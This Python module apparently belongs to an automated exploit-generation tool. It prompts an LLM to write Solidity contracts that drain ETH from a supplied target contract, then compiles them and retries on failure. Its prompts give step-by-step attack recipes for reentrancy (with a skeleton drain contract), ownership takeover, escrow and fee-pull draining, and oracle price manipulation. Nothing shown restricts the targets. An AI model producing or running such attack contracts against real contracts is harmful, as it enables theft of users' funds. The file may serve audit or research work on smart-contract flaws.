"""
Exploit contract generation — Nemotron Ultra writes Solidity from scratch.
"""
import json
import time
from dataclasses import dataclass, field

from openai import OpenAI

from orchestrator import chain, config
from orchestrator.exceptions import CompilationFailed
from orchestrator.recon import map_functions
from orchestrator.revert import clean_revert_reason

_client = None

REENTRANCY_PROMPT = """You are a smart contract security researcher writing a reentrancy exploit.

CONSTRAINTS:
- First line: pragma solidity ^0.8.19;
- constructor(address target) and payable function attack()
- REQUIRED 3-step pattern:
  1. attack() deposits >= 1 ether into target via deposit()
  2. attack() calls target.withdraw() once to start the drain
  3. receive() external payable re-enters withdraw() while target balance >= 1 ether
- receive() MUST exist and call withdraw() again (this is the reentrancy hook)
- Stop re-entering when address(target).balance < 1 ether
- Send at least 1 ether (1000000000000000000 wei) with attack()
- No external imports; inline interfaces only
- Return JSON: solidity_source, contract_name, entry_function, entry_value_wei, reasoning

REFERENCE SKELETON (structure only):
  contract Exploit { constructor(address t) { target = t; }
    function attack() external payable { target.deposit{value: 1 ether}(); target.withdraw(); }
    receive() external payable { if (address(target).balance >= 1 ether) target.withdraw(); }
  }
"""

ACCESS_CONTROL_PROMPT = """You are a smart contract security researcher writing an access-control exploit.

CONSTRAINTS:
- First line: pragma solidity ^0.8.19;
- constructor(address target) and function attack() — attack() may be non-payable
- Common patterns (pick what the TARGET SOURCE actually has):
  1. withdrawAll() / sweep() with NO owner check — call it directly from attack()
  2. changeOwner(address) / setOwner / transferOwnership WITHOUT onlyOwner — call
     changeOwner(address(this)) then withdrawAll() from attack()
  3. initialize(address) callable by anyone — claim ownership then drain
- If the target sends ETH to msg.sender, include: receive() external payable {}
- No external imports; inline interfaces only
- Return JSON: solidity_source, contract_name, entry_function, entry_value_wei, reasoning
"""

LOGIC_ESCROW_PROMPT = """You are a smart contract security researcher writing a logic / economic exploit.

CONSTRAINTS:
- First line: pragma solidity ^0.8.19;
- constructor(address target) and function attack() — may be payable
- Patterns to consider from TARGET SOURCE:
  1. release(address beneficiary) that pays msg.sender from beneficiary's locked balance
  2. flashFee() / similar permissionless fee pull — call it (repeat if needed) to drain
  3. contribute() + receive()/fallback that seizes ownership, then withdraw()
- If ETH is sent to your contract, include receive() external payable {}
- No external imports; inline interfaces only
- Return JSON: solidity_source, contract_name, entry_function, entry_value_wei, reasoning
"""

GENERAL_PROMPT = """You are a smart contract security researcher writing an exploit contract.

CONSTRAINTS:
- First line: pragma solidity ^0.8.19;
- constructor(address target) and function attack()
- Match the vulnerability class indicated in SECURITY ANALYSIS FLAGS
- Read the TARGET SOURCE carefully — privilege escalation often needs
  changeOwner/initialize before a privileged withdraw
- No external imports; inline interfaces only
- Return JSON: solidity_source, contract_name, entry_function, entry_value_wei, reasoning
"""

OWASP_TAXONOMY = (
    "Label risk_pattern using OWASP Smart Contract Top 10 (2025) where possible: "
    "reentrancy (SC05), access_control (SC01), logic|escrow, oracle_manipulation, "
    "unchecked_call, or general."
)


@dataclass
class ExploitProposal:
    solidity_source: str
    contract_name: str
    entry_function: str
    entry_value_wei: int
    reasoning: str
    abi: list = field(default_factory=list)
    bytecode: str = ""


def _get_client() -> OpenAI:
    global _client
    if _client is None:
        if not config.NEBIUS_API_KEY:
            raise ValueError("NEBIUS_API_KEY is required for proposer")
        _client = OpenAI(
            api_key=config.NEBIUS_API_KEY,
            base_url=config.NEBIUS_BASE_URL,
            timeout=config.LLM_TIMEOUT_SECONDS,
        )
    return _client


def _primary_pattern(risk_flags: list[dict]) -> str:
    if not risk_flags:
        return "general"
    return risk_flags[0].get("risk_pattern", "general").lower()


def _system_prompt_for_flags(risk_flags: list[dict]) -> str:
    pattern = _primary_pattern(risk_flags)
    if "escrow" in pattern or "logic" in pattern:
        return LOGIC_ESCROW_PROMPT
    if "oracle" in pattern:
        return ORACLE_PROMPT
    if "access" in pattern:
        return ACCESS_CONTROL_PROMPT
    if "reentranc" in pattern:
        return REENTRANCY_PROMPT
    return GENERAL_PROMPT


ORACLE_PROMPT = """You are a smart contract security researcher writing an oracle-manipulation exploit.

CONSTRAINTS:
- First line: pragma solidity ^0.8.19;
- constructor(address target) and function attack() payable
- Typical pattern: deposit() some ETH, call setPrice(inflated), then withdraw()
  to redeem shares at the manipulated price and drain the vault
- Include receive() external payable {} if needed
- No external imports; inline interfaces only
- Return JSON: solidity_source, contract_name, entry_function, entry_value_wei, reasoning
"""


def _format_precedent(precedent_results: list[dict]) -> str:
    if not precedent_results:
        return "No Tavily results returned (search ran but empty)."
    lines = []
    for item in precedent_results:
        lines.append(
            f"- {item.get('title', 'Unknown')}: {item.get('url', '')}\n"
            f"  {item.get('content', '')[:500]}"
        )
    return "\n".join(lines)


def _format_abi_summary(abi: list) -> str:
    summaries = map_functions(abi)
    return json.dumps(summaries, indent=2)


def _parse_proposal(raw: str) -> ExploitProposal:
    """Parse Ultra JSON response into ExploitProposal."""
    if not raw or not raw.strip():
        raise ValueError("Empty response from Ultra")
    parsed = json.loads(raw)
    required = ("solidity_source", "contract_name")
    missing = [k for k in required if k not in parsed]
    if missing:
        raise ValueError(f"Missing keys in Ultra response: {missing}")
    return ExploitProposal(
        solidity_source=parsed["solidity_source"],
        contract_name=parsed["contract_name"],
        entry_function=parsed.get("entry_function", "attack"),
        entry_value_wei=int(parsed.get("entry_value_wei", 10**18)),
        reasoning=parsed.get("reasoning", ""),
    )


def _call_ultra(messages: list[dict]) -> tuple[ExploitProposal, str, float]:
    """Call Ultra and parse JSON response. Returns proposal, raw, duration."""
    start = time.time()
    client = _get_client()
    last_err = None
    raw = ""
    for attempt in range(3):
        try:
            response = client.chat.completions.create(
                model=config.MODEL_ULTRA,
                messages=messages,
                response_format={"type": "json_object"},
                max_tokens=8192,
            )
            raw = response.choices[0].message.content or ""
            proposal = _parse_proposal(raw)
            duration = time.time() - start
            return proposal, raw, duration
        except (json.JSONDecodeError, ValueError, KeyError) as exc:
            last_err = exc
            messages.append(
                {
                    "role": "user",
                    "content": (
                        f"Your response was invalid ({exc}). "
                        "Return valid JSON with solidity_source, contract_name, "
                        "entry_function, entry_value_wei, reasoning."
                    ),
                }
            )
    raise ValueError(f"Ultra returned invalid JSON after retries: {last_err}")


def propose_exploit(
    source_code: str,
    risk_flags: list[dict],
    precedent_results: list[dict],
    prior_failure: dict | None = None,
    abi: list | None = None,
    target_name: str = "",
) -> tuple[ExploitProposal, dict]:
    """
    Generate and compile an exploit contract via Ultra.

    Returns (proposal, timing_info).
    """
    timing = {
        "step": "propose",
        "model": config.MODEL_ULTRA,
        "compile_attempts": [],
        "llm_calls": [],
    }
    system_prompt = _system_prompt_for_flags(risk_flags)
    abi_block = _format_abi_summary(abi or [])

    if prior_failure:
        prev_src = prior_failure.get("previous_source", "")
        user_content = f"""Your previous exploit failed.

Revert reason: {clean_revert_reason(prior_failure.get('revert_reason'))}
Research on this error:
{_format_precedent(prior_failure.get('research', []))}

Previous exploit source (revise this):
{prev_src[:3000] if prev_src else 'N/A'}

TARGET: {target_name}
TARGET CONTRACT SOURCE:
{source_code}

TARGET ABI (callable functions):
{abi_block}

SECURITY ANALYSIS FLAGS:
{json.dumps(risk_flags, indent=2)}

Write a revised exploit contract that avoids this failure mode.
"""
    else:
        user_content = f"""TARGET: {target_name}
TARGET CONTRACT SOURCE:
{source_code}

TARGET ABI (callable functions):
{abi_block}

SECURITY ANALYSIS FLAGS:
{json.dumps(risk_flags, indent=2)}

HISTORICAL PRECEDENT (Tavily — use these to shape strategy):
{_format_precedent(precedent_results)}

Write an exploit contract that drains ETH from this target.
"""

    messages = [
        {"role": "system", "content": system_prompt},
        {"role": "user", "content": user_content},
    ]

    last_error = None
    for attempt in range(config.MAX_COMPILE_RETRIES):
        proposal, raw, llm_duration = _call_ultra(messages)
        timing["llm_calls"].append({"attempt": attempt, "duration_s": llm_duration})
        compile_start = time.time()
        try:
            abi_out, bytecode = chain.compile_source_code(
                proposal.solidity_source, proposal.contract_name
            )
            proposal.abi = abi_out
            proposal.bytecode = bytecode
            timing["compile_attempts"].append(
                {
                    "attempt": attempt,
                    "success": True,
                    "duration_s": time.time() - compile_start,
                }
            )
            return proposal, timing
        except Exception as compile_err:
            last_error = str(compile_err)
            timing["compile_attempts"].append(
                {
                    "attempt": attempt,
                    "success": False,
                    "error": last_error,
                    "duration_s": time.time() - compile_start,
                }
            )
            messages.append({"role": "assistant", "content": raw})
            messages.append(
                {
                    "role": "user",
                    "content": (
                        f"Your previous Solidity code failed to compile:\n"
                        f"{last_error}\n\nFix the compilation error and "
                        "return the corrected contract."
                    ),
                }
            )

    raise CompilationFailed(
        f"Ultra failed to produce compilable Solidity after "
        f"{config.MAX_COMPILE_RETRIES} attempts: {last_error}"
    )
